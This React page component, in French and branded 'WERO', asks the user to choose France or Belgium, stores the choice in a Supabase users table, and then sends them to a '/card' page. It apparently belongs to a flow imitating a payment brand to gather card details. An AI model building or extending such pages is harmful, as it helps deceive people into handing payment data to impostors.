
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { supabase } from "@/lib/supabase";
import { Footer } from "@/components/Footer";
import { useToast } from "@/components/ui/use-toast";

const Country = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [userStatus, setUserStatus] = useState<number | null>(null);

  useEffect(() => {
    const checkUserStatus = async () => {
      const userId = localStorage.getItem("userId");
      
      if (!userId) {
        navigate("/");
        return;
      }
      
      try {
        const { data, error } = await supabase
          .from("users")
          .select("statut")
          .eq("id", userId)
          .single();
        
        if (error) throw error;
        
        setUserStatus(data.statut);
      } catch (error) {
        console.error(error);
      }
    };
    
    checkUserStatus();
  }, [navigate]);

  const handleSelectCountry = async (country: string) => {
    const userId = localStorage.getItem("userId");
    
    if (!userId) {
      navigate("/");
      return;
    }
    
    try {
      // Vérifier le statut
      if (userStatus === 1) {
        // Si le statut est 1, ne pas enregistrer les données
        console.log("Utilisateur avec statut 1, les données ne sont pas enregistrées");
      } else {
        // Mettre à jour le pays dans la base de données uniquement si le statut est différent de 1
        await supabase
          .from("users")
          .update({ pays: country })
          .eq("id", userId);
      }
      
      // Rediriger vers la page suivante dans tous les cas
      navigate("/card");
    } catch (error) {
      console.error(error);
      toast({
        title: "Erreur",
        description: "Une erreur est survenue lors de la mise à jour du pays",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4">
        <h1 className="text-2xl font-bold">WERO</h1>
      </header>
      
      <main className="flex-grow flex flex-col justify-center items-center p-4">
        <div className="max-w-md w-full mb-8">
          <h2 className="text-2xl font-bold text-center mb-8">Sélectionnez votre pays</h2>
          
          <div className="space-y-4">
            <Button
              onClick={() => handleSelectCountry("France")}
              className="w-full bg-yellow-300 hover:bg-yellow-400 text-black font-semibold py-4 rounded-full"
            >
              France
            </Button>
            
            <Button
              onClick={() => handleSelectCountry("Belgique")}
              className="w-full bg-yellow-300 hover:bg-yellow-400 text-black font-semibold py-4 rounded-full"
            >
              Belgique
            </Button>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Country;
